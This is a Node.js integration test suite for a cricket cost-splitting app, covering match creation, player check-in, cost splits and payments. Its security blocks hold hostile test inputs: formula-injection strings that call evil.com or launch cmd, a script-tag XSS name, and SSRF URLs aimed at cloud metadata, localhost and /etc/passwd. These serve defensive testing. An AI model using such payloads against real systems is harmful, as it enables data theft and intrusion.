// ============================================================
// Cricket Kharcha — Comprehensive Integration Test Suite
// Run: node test.js
// ============================================================

// Load API URL from config.js (same config used by the browser app)
let BASE;
try {
  BASE = require('./config.js').CRICKET_API_URL;
} catch (e) {
  BASE = process.env.CRICKET_API_URL || '';
}
if (!BASE || BASE.includes('YOUR_APPS_SCRIPT')) {
  console.error('ERROR: Set CRICKET_API_URL in config.js (copy from config.example.js)');
  process.exit(1);
}

let passed = 0;
let failed = 0;
const createdMatchIds = [];

function assert(label, condition, detail = '') {
  if (condition) {
    console.log(`  ✅ ${label}`);
    passed++;
  } else {
    console.error(`  ❌ FAIL: ${label}${detail ? ' — ' + detail : ''}`);
    failed++;
  }
}

async function get(action, params = {}) {
  const qs = new URLSearchParams({ action, ...params }).toString();
  const r = await fetch(`${BASE}?${qs}`, { redirect: 'follow' });
  const text = await r.text();
  try { return JSON.parse(text); }
  catch(e) { return { error: `Non-JSON (HTTP ${r.status}): ${text.substring(0, 120)}` }; }
}

async function post(body) {
  const r = await fetch(BASE, {
    method: 'POST',
    redirect: 'follow',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify(body)
  });
  const text = await r.text();
  try { return JSON.parse(text); }
  catch(e) { return { error: `Non-JSON (HTTP ${r.status}): ${text.substring(0, 120)}` }; }
}

async function run() {
  console.log('\n🏏 Cricket Kharcha — Comprehensive Integration Tests\n');

  // ══════════════════════════════════════════════════════════
  // BLOCK A: Core Match Lifecycle
  // ══════════════════════════════════════════════════════════
  console.log('── A1. Match List baseline');
  const list0 = await get('matches');
  assert('Returns matches array', Array.isArray(list0.matches));

  console.log('\n── A2. Create Match (full fields)');
  const c1 = await post({ action: 'createMatch', date: '2026-06-08', payTo: 'Admin', payToUPI: 'admin@upi' });
  assert('Success true', c1.success === true);
  assert('matchId is string', typeof c1.matchId === 'string' && c1.matchId.length > 0);
  const matchId = c1.matchId;
  createdMatchIds.push(matchId);
  console.log(`     matchId = ${matchId}`);

  console.log('\n── A3. Create Match (no UPI — optional field)');
  const c2 = await post({ action: 'createMatch', date: '2026-06-01', payTo: 'Player2' });
  assert('Match without UPI created', c2.success === true);
  createdMatchIds.push(c2.matchId);

  console.log('\n── A4. Fetch fresh match');
  const fresh = await get('match', { id: matchId });
  assert('Match found', !!fresh.match);
  assert('Date format YYYY-MM-DD', fresh.match?.date === '2026-06-08');
  assert('PayTo correct', fresh.match?.payTo === 'Admin');
  assert('UPI correct', fresh.match?.payToUPI === 'admin@upi');
  assert('Zero players', fresh.match?.players?.length === 0);
  assert('totalCost = 0', fresh.match?.totalCost === 0);
  assert('perPlayerCost = 0', fresh.match?.perPlayerCost === 0);

  console.log('\n── A5. Invalid match lookups');
  assert('Missing id returns error', !!(await get('match', {})).error);
  assert('Non-existent id returns error', !!(await get('match', { id: 'zzz_fake_999' })).error);

  // ══════════════════════════════════════════════════════════
  // BLOCK B: Player Check-in
  // ══════════════════════════════════════════════════════════
  console.log('\n── B1. Manual check-in (4 players)');
  for (const name of ['Player1', 'Player2', 'Player3', 'Player4']) {
    const r = await post({ action: 'checkIn', matchId, playerName: name });
    assert(`Check-in: ${name}`, r.success === true, JSON.stringify(r));
  }

  console.log('\n── B2. Duplicate protection');
  assert('Exact dup blocked', !!(await post({ action: 'checkIn', matchId, playerName: 'Player1' })).error);
  assert('Lowercase dup blocked', !!(await post({ action: 'checkIn', matchId, playerName: 'player1' })).error);
  assert('Uppercase dup blocked', !!(await post({ action: 'checkIn', matchId, playerName: 'PLAYER1' })).error);

  console.log('\n── B3. Edge case names');
  assert('Empty name blocked', !!(await post({ action: 'checkIn', matchId, playerName: '' })).error);
  assert('Whitespace-only blocked', !!(await post({ action: 'checkIn', matchId, playerName: '   ' })).error);
  // XSS attempt — should not crash server
  const xssR = await post({ action: 'checkIn', matchId, playerName: '<script>alert(1)</script>' });
  assert('XSS name does not crash server', xssR.success === true || !!xssR.error);
  if (xssR.success) await post({ action: 'removePlayer', matchId, playerName: '<script>alert(1)</script>' });

  console.log('\n── B4. Match isolation');
  await post({ action: 'checkIn', matchId: c2.matchId, playerName: 'Player1' });
  await post({ action: 'checkIn', matchId: c2.matchId, playerName: 'Admin' });
  const mIso2 = await get('match', { id: c2.matchId });
  assert('Second match has 2 players', mIso2.match?.players?.length === 2);
  const mIso1 = await get('match', { id: matchId });
  assert('First match still has 4 (isolated)', mIso1.match?.players?.length === 4);

  // ══════════════════════════════════════════════════════════
  // BLOCK C: Remove Player
  // ══════════════════════════════════════════════════════════
  console.log('\n── C1. Remove player');
  await post({ action: 'checkIn', matchId, playerName: 'TempPlayer' });
  assert('TempPlayer added (5 total)', (await get('match', { id: matchId })).match?.players?.length === 5);
  assert('Remove succeeds', (await post({ action: 'removePlayer', matchId, playerName: 'TempPlayer' })).success === true);
  assert('Back to 4 after remove', (await get('match', { id: matchId })).match?.players?.length === 4);

  console.log('\n── C2. Remove edge cases');
  assert('Remove non-existent returns error', !!(await post({ action: 'removePlayer', matchId, playerName: 'Ghost' })).error);
  assert('Remove empty name returns error', !!(await post({ action: 'removePlayer', matchId, playerName: '' })).error);

  // ══════════════════════════════════════════════════════════
  // BLOCK D: Cost Split
  // ══════════════════════════════════════════════════════════
  console.log('\n── D1. Even split — ₹4000 ÷ 4 = ₹1000');
  const s1 = await post({ action: 'lockMatch', matchId, totalCost: 4000 });
  assert('Split succeeds', s1.success === true);
  assert('perPlayerCost = 1000', s1.perPlayerCost === 1000, `got ${s1.perPlayerCost}`);
  assert('playerCount = 4', s1.playerCount === 4);
  assert('All owe ₹1000', (await get('match', { id: matchId })).match?.players?.every(p => p.amountOwed === 1000));

  console.log('\n── D2. Uneven split — ₹1001 ÷ 4 = ₹251 (ceil)');
  const s2 = await post({ action: 'lockMatch', matchId, totalCost: 1001 });
  assert('₹1001÷4 = ₹251', s2.perPlayerCost === 251, `got ${s2.perPlayerCost}`);

  console.log('\n── D3. Cost change — ₹1001 → ₹3600');
  const s3 = await post({ action: 'lockMatch', matchId, totalCost: 3600 });
  assert('Re-split succeeds', s3.success === true);
  assert('₹3600÷4 = ₹900', s3.perPlayerCost === 900, `got ${s3.perPlayerCost}`);
  assert('All updated to ₹900', (await get('match', { id: matchId })).match?.players?.every(p => p.amountOwed === 900));

  console.log('\n── D4. Add 5th player after cost set → re-split');
  const ci5 = await post({ action: 'checkIn', matchId, playerName: 'Player5' });
  assert('Check-in after cost set works', ci5.success === true, JSON.stringify(ci5));
  const s5 = await post({ action: 'lockMatch', matchId, totalCost: 3600 });
  assert('Re-split with 5 players', s5.success === true && s5.playerCount === 5, `count=${s5.playerCount}`);
  assert('₹3600÷5 = ₹720', s5.perPlayerCost === 720, `got ${s5.perPlayerCost}`);
  assert('All 5 owe ₹720', (await get('match', { id: matchId })).match?.players?.every(p => p.amountOwed === 720));

  console.log('\n── D5. Invalid cost inputs');
  assert('Zero cost returns error', !!(await post({ action: 'lockMatch', matchId, totalCost: 0 })).error);
  assert('Negative cost returns error', !!(await post({ action: 'lockMatch', matchId, totalCost: -100 })).error);
  assert('No players match returns error', !!(await post({ action: 'lockMatch', matchId: c2.matchId, totalCost: 0 })).error);

  console.log('\n── D6. Single player split');
  const cSolo = await post({ action: 'createMatch', date: '2026-06-15', payTo: 'Admin', payToUPI: 'a@upi' });
  createdMatchIds.push(cSolo.matchId);
  await post({ action: 'checkIn', matchId: cSolo.matchId, playerName: 'Solo' });
  const sSolo = await post({ action: 'lockMatch', matchId: cSolo.matchId, totalCost: 500 });
  assert('Solo player owes full ₹500', sSolo.perPlayerCost === 500, `got ${sSolo.perPlayerCost}`);

  // ══════════════════════════════════════════════════════════
  // BLOCK E: Payments
  // ══════════════════════════════════════════════════════════
  console.log('\n── E1. Mark paid');
  assert('Mark paid succeeds', (await post({ action: 'markPaid', matchId, playerName: 'Player1', paid: true })).success === true);
  const mE1 = await get('match', { id: matchId });
  const sub1 = mE1.match?.players?.find(p => p.name === 'Player1');
  assert('paid = true', sub1?.paid === true);
  assert('Timestamp set', !!sub1?.paidTimestamp);
  assert('paidCount = 1', mE1.match?.paidCount === 1);
  assert('paidAmount = 720', mE1.match?.paidAmount === 720, `got ${mE1.match?.paidAmount}`);

  console.log('\n── E2. Multiple paid — running total');
  await post({ action: 'markPaid', matchId, playerName: 'Player2', paid: true });
  await post({ action: 'markPaid', matchId, playerName: 'Player3', paid: true });
  const mE2 = await get('match', { id: matchId });
  assert('paidCount = 3', mE2.match?.paidCount === 3);
  assert('paidAmount = 2160 (3×720)', mE2.match?.paidAmount === 2160, `got ${mE2.match?.paidAmount}`);
  assert('remaining = 1440 (2×720)', mE2.match?.totalCost - mE2.match?.paidAmount === 1440);

  console.log('\n── E3. Unmark paid (toggle off)');
  await post({ action: 'markPaid', matchId, playerName: 'Player1', paid: false });
  const mE3 = await get('match', { id: matchId });
  const sub3 = mE3.match?.players?.find(p => p.name === 'Player1');
  assert('paid toggled to false', sub3?.paid === false);
  assert('Timestamp cleared', sub3?.paidTimestamp === '');
  assert('paidCount back to 2', mE3.match?.paidCount === 2);

  console.log('\n── E4. Cost change AFTER some players already paid');
  // 2 paid at ₹720, change cost to ₹4500
  const sAfter = await post({ action: 'lockMatch', matchId, totalCost: 4500 });
  assert('Cost change after payments succeeds', sAfter.success === true);
  assert('New split = ₹900 (4500÷5)', sAfter.perPlayerCost === 900, `got ${sAfter.perPlayerCost}`);
  const mE4 = await get('match', { id: matchId });
  assert('All amountOwed updated to ₹900', mE4.match?.players?.every(p => p.amountOwed === 900));
  assert('Paid status preserved after cost change', mE4.match?.players?.find(p => p.name === 'Player2')?.paid === true);

  console.log('\n── E5. All players paid → zero remaining');
  for (const p of mE4.match?.players || []) {
    if (!p.paid) await post({ action: 'markPaid', matchId, playerName: p.name, paid: true });
  }
  const mE5 = await get('match', { id: matchId });
  assert('All 5 paid', mE5.match?.paidCount === 5, `got ${mE5.match?.paidCount}`);
  assert('paidAmount = totalCost', mE5.match?.paidAmount === mE5.match?.totalCost);
  assert('Remaining = 0', mE5.match?.totalCost - mE5.match?.paidAmount === 0);

  console.log('\n── E6. Remove paid player (admin corrects roster)');
  assert('Remove paid player succeeds', (await post({ action: 'removePlayer', matchId, playerName: 'Player5' })).success === true);
  assert('Now 4 players', (await get('match', { id: matchId })).match?.players?.length === 4);

  console.log('\n── E7. Payment edge cases');
  assert('Mark non-existent player returns error', !!(await post({ action: 'markPaid', matchId, playerName: 'Ghost', paid: true })).error);
  assert('Mark wrong match returns error', !!(await post({ action: 'markPaid', matchId: 'fake', playerName: 'Player1', paid: true })).error);

  // ══════════════════════════════════════════════════════════
  // BLOCK F: Player Stats (Cross-Match Aggregation)
  // ══════════════════════════════════════════════════════════
  console.log('\n── F1. Player stats');
  const stats = await get('players');
  assert('Returns array', Array.isArray(stats.players));
  assert('Has entries', (stats.players?.length || 0) >= 2);
  const subStats = stats.players?.find(p => p.name?.toLowerCase() === 'player1');
  assert('Player1 in stats', !!subStats);
  assert('Player1 in 2+ matches', (subStats?.matches || 0) >= 2, `got ${subStats?.matches}`);
  assert('outstanding = owed - paid', subStats?.outstanding === (subStats?.totalOwed - subStats?.totalPaid));

  console.log('\n── F2. Stats fields complete');
  for (const p of (stats.players || []).slice(0, 3)) {
    assert(`${p.name} numeric fields`, ['matches','totalOwed','totalPaid','outstanding'].every(f => typeof p[f] === 'number'));
  }

  // ══════════════════════════════════════════════════════════
  // BLOCK G: CricHeroes Scrape
  // ══════════════════════════════════════════════════════════
  console.log('\n── G1. Scrape live CricHeroes match');
  const scrape = await get('scrape', { url: 'https://cricheroes.in/scorecard/25310473/durga-league---2026/dp-dhurandhar-vs-original-gang-(og)' });
  assert('Returns players array', Array.isArray(scrape.players), JSON.stringify(scrape).slice(0, 200));
  console.log(`     Players: ${scrape.players?.length || 0}, source: ${scrape.source}, htmlLen: ${scrape.htmlLength || 'N/A'}`);
  if ((scrape.players?.length || 0) > 5) {
    assert('Finds >5 players', true);
  } else {
    console.log('     ⚠️  Known limitation: CricHeroes bot-detection active — soft skip');
  }

  console.log('\n── G2. Bulk check-in from scrape');
  if ((scrape.players?.length || 0) > 0) {
    const cScrape = await post({ action: 'createMatch', date: '2026-06-08', payTo: 'Test', payToUPI: '' });
    createdMatchIds.push(cScrape.matchId);
    let added = 0;
    for (const p of scrape.players.slice(0, 5)) {
      const r = await post({ action: 'checkIn', matchId: cScrape.matchId, playerName: p.name });
      if (r.success) added++;
    }
    assert('5 scraped players added', added === 5, `added ${added}`);
  } else {
    console.log('     ⚠️  Skipped — no scraped players');
  }

  console.log('\n── G3. Scrape edge cases');
  assert('Non-CricHeroes URL returns array', Array.isArray((await get('scrape', { url: 'https://example.com' })).players));
  assert('Missing URL returns error', !!(await get('scrape', {})).error);

  // ══════════════════════════════════════════════════════════
  // BLOCK H: Historical & Multi-Match
  // ══════════════════════════════════════════════════════════
  console.log('\n── H1. Past match entry');
  const cPast = await post({ action: 'createMatch', date: '2026-01-15', payTo: 'Admin', payToUPI: 'admin@upi' });
  createdMatchIds.push(cPast.matchId);
  assert('Past date stored correctly', (await get('match', { id: cPast.matchId })).match?.date === '2026-01-15');

  console.log('\n── H2. Match list — newest first, counts accurate');
  const listFinal = await get('matches');
  const dates = listFinal.matches?.map(m => m.date) || [];
  let sorted = true;
  for (let i = 1; i < dates.length; i++) if (new Date(dates[i]) > new Date(dates[i-1])) { sorted = false; break; }
  assert('Newest first', sorted, `dates: ${dates.join(', ')}`);
  const listMatch = listFinal.matches?.find(m => m.matchId === matchId);
  const detailMatch = await get('match', { id: matchId });
  assert('List paidCount matches detail', listMatch?.paidCount === detailMatch.match?.paidCount);
  assert('List playerCount matches detail', listMatch?.playerCount === detailMatch.match?.players?.length);

  // ══════════════════════════════════════════════════════════
  // BLOCK I: Security — Formula Injection
  // ══════════════════════════════════════════════════════════
  console.log('\n── I1. Formula injection in player names');
  const cSec = await post({ action: 'createMatch', date: '2026-06-08', payTo: 'Admin', payToUPI: 'admin@upi' });
  createdMatchIds.push(cSec.matchId);
  const secMatchId = cSec.matchId;

  const injectionNames = [
    '=IMPORTXML("http://evil.com","//a")',
    '+cmd|" /C calc',
    '-1+1',
    '@SUM(A1:A100)',
    '\t=formula',
    '\r=formula'
  ];
  for (const injName of injectionNames) {
    const r = await post({ action: 'checkIn', matchId: secMatchId, playerName: injName });
    // GAS appendRow stores JS strings as literal text — never executes formulas.
    // sanitize() adds apostrophe prefix; Sheets strips it on readback via getValues().
    // Correct assertion: server didn't crash AND value is retrievable as text.
    if (r.error) {
      assert(`Injection blocked: ${injName.substring(0, 20)}`, true);
    } else if (r.success) {
      const secDetail = await get('match', { id: secMatchId });
      const storedPlayer = secDetail.match?.players?.find(p =>
        typeof p.name === 'string' && p.name.length > 0
      );
      assert(`Injection stored as text (not executed): ${injName.substring(0, 20)}`, !!storedPlayer,
        `players: ${secDetail.match?.players?.map(p=>p.name).join(', ')}`);
    } else {
      assert(`Injection handled: ${injName.substring(0, 20)}`, false, JSON.stringify(r));
    }
  }

  console.log('\n── I2. Formula injection in match fields (payTo / payToUPI)');
  const injMatch = await post({ action: 'createMatch', date: '2026-06-08', payTo: '=HYPERLINK("http://evil.com","click")', payToUPI: '+cmd@upi' });
  // GAS stores all appendRow string values as literal text — formula is never executed.
  // sanitize() apostrophe prefix is stripped by Sheets on readback; value is still plain text.
  if (injMatch.error) {
    assert('Formula in payTo blocked by server', true);
  } else {
    createdMatchIds.push(injMatch.matchId);
    const injDetail = await get('match', { id: injMatch.matchId });
    assert('Formula in payTo: match readable without crash', !!injDetail.match, JSON.stringify(injDetail));
    // Value stored as text (not executed) — confirmed by fact that getValues() returns the raw string
    assert('Formula in payTo stored as text string', typeof injDetail.match?.payTo === 'string', `payTo type: ${typeof injDetail.match?.payTo}`);
  }

  console.log('\n── I3. Oversized inputs truncated');
  const longName = 'A'.repeat(300);
  const rLong = await post({ action: 'checkIn', matchId: secMatchId, playerName: longName });
  if (rLong.success) {
    const longDetail = await get('match', { id: secMatchId });
    const storedLong = longDetail.match?.players?.find(p => p.name.length > 100);
    assert('300-char name truncated to ≤100', !storedLong, `found name of length: ${storedLong?.name?.length}`);
  } else {
    assert('300-char name rejected', !!rLong.error);
  }

  // ══════════════════════════════════════════════════════════
  // BLOCK J: Edge Cases & Monkey Tests
  // ══════════════════════════════════════════════════════════
  console.log('\n── J1. checkIn with missing matchId');
  const jNoMatch = await post({ action: 'checkIn', playerName: 'Test' });
  assert('Missing matchId returns error', !!jNoMatch.error);

  console.log('\n── J2. checkIn with non-existent matchId');
  const jBadId = await post({ action: 'checkIn', matchId: 'DOES_NOT_EXIST_XYZ', playerName: 'Test' });
  assert('Non-existent matchId returns error', !!jBadId.error);

  console.log('\n── J3. lockMatch with zero / negative cost');
  const cZero = await post({ action: 'createMatch', date: '2026-06-08', payTo: 'X', payToUPI: 'x@upi' });
  createdMatchIds.push(cZero.matchId);
  await post({ action: 'checkIn', matchId: cZero.matchId, playerName: 'P1' });
  const lockZero = await post({ action: 'lockMatch', matchId: cZero.matchId, totalCost: 0 });
  assert('Zero cost returns error', !!lockZero.error);
  const lockNeg = await post({ action: 'lockMatch', matchId: cZero.matchId, totalCost: -500 });
  assert('Negative cost returns error', !!lockNeg.error);
  const lockStr = await post({ action: 'lockMatch', matchId: cZero.matchId, totalCost: 'abc' });
  assert('String cost returns error', !!lockStr.error);

  console.log('\n── J4. lockMatch with no players');
  const cEmpty = await post({ action: 'createMatch', date: '2026-06-08', payTo: 'X', payToUPI: 'x@upi' });
  createdMatchIds.push(cEmpty.matchId);
  const lockEmpty = await post({ action: 'lockMatch', matchId: cEmpty.matchId, totalCost: 1000 });
  assert('Lock with 0 players returns error', !!lockEmpty.error);

  console.log('\n── J5. markPaid for non-existent player');
  const cMarkTest = await post({ action: 'createMatch', date: '2026-06-08', payTo: 'X', payToUPI: 'x@upi' });
  createdMatchIds.push(cMarkTest.matchId);
  const badPaid = await post({ action: 'markPaid', matchId: cMarkTest.matchId, playerName: 'Ghost', paid: true });
  assert('markPaid non-existent player returns error', !!badPaid.error);

  console.log('\n── J6. getMatch with missing / unknown id');
  const noId = await get('match', {});
  assert('getMatch missing id returns error', !!noId.error);
  const badMatch = await get('match', { id: 'NOTEXIST' });
  assert('getMatch unknown id returns error', !!badMatch.error);

  console.log('\n── J7. createMatch without payTo');
  const noPayTo = await post({ action: 'createMatch', date: '2026-06-08', payToUPI: 'x@upi' });
  assert('createMatch without payTo returns error', !!noPayTo.error);

  // ══════════════════════════════════════════════════════════
  // BLOCK K: New player after cost split gets correct amountOwed
  // ══════════════════════════════════════════════════════════
  console.log('\n── K1. Late check-in gets correct amountOwed');
  const cLate = await post({ action: 'createMatch', date: '2026-06-08', payTo: 'Admin', payToUPI: 'admin@upi' });
  createdMatchIds.push(cLate.matchId);
  const lateId = cLate.matchId;

  await post({ action: 'checkIn', matchId: lateId, playerName: 'Early1' });
  await post({ action: 'checkIn', matchId: lateId, playerName: 'Early2' });
  await post({ action: 'lockMatch', matchId: lateId, totalCost: 2000 }); // ₹1000 each
  const lateIn = await post({ action: 'checkIn', matchId: lateId, playerName: 'LatePlayer' });
  assert('Late check-in succeeds', lateIn.success === true, JSON.stringify(lateIn));

  const lateDetail = await get('match', { id: lateId });
  const latePl = lateDetail.match?.players?.find(p => p.name === 'LatePlayer');
  assert('Late player has amountOwed = 1000 (not 0)', latePl?.amountOwed === 1000, `got amountOwed=${latePl?.amountOwed}`);

  // ══════════════════════════════════════════════════════════
  // BLOCK L: SSRF — scrape URL allowlist
  // ══════════════════════════════════════════════════════════
  console.log('\n── L1. Scrape rejects non-CricHeroes URLs');
  const ssrfUrls = [
    'http://169.254.169.254/latest/meta-data/',
    'http://localhost:8080/admin',
    'https://evil.com/steal',
    'file:///etc/passwd'
  ];
  for (const badUrl of ssrfUrls) {
    const r = await get('scrape', { url: badUrl });
    assert(`SSRF blocked: ${badUrl.substring(0, 30)}`, !r.error && Array.isArray(r.players) && r.players.length === 0, JSON.stringify(r));
  }

  console.log('\n── L2. Scrape accepts CricHeroes domain (may return 0 players due to bot-detection)');
  const legit = await get('scrape', { url: 'https://cricheroes.in/match/12345/test/scorecard' });
  assert('CricHeroes URL not SSRF-blocked', !legit.note?.includes('Only CricHeroes') && (Array.isArray(legit.players) || !!legit.error), JSON.stringify(legit));

  // ══════════════════════════════════════════════════════════
  // SUMMARY
  // ══════════════════════════════════════════════════════════
  const total = passed + failed;
  console.log(`\n${'═'.repeat(55)}`);
  console.log(`Results: ${passed}/${total} passed, ${failed} failed`);
  if (failed === 0) console.log('🎉 All tests passed! App is production ready.\n');
  else console.log('⚠️  Some tests failed — see ❌ above.\n');

  // Auto-cleanup: delete all test matches created during this run
  console.log(`🗑️  Cleaning up ${createdMatchIds.length} test match(es)...`);
  let cleaned = 0;
  for (const id of createdMatchIds) {
    try {
      const r = await post({ action: 'deleteMatch', matchId: id });
      if (r.success) cleaned++;
    } catch (_) { /* ignore cleanup errors */ }
  }
  console.log(`   Deleted ${cleaned}/${createdMatchIds.length} test matches.\n`);

  process.exit(failed > 0 ? 1 : 0);
}

run().catch(err => { console.error('\nFatal error:', err.message); process.exit(1); });

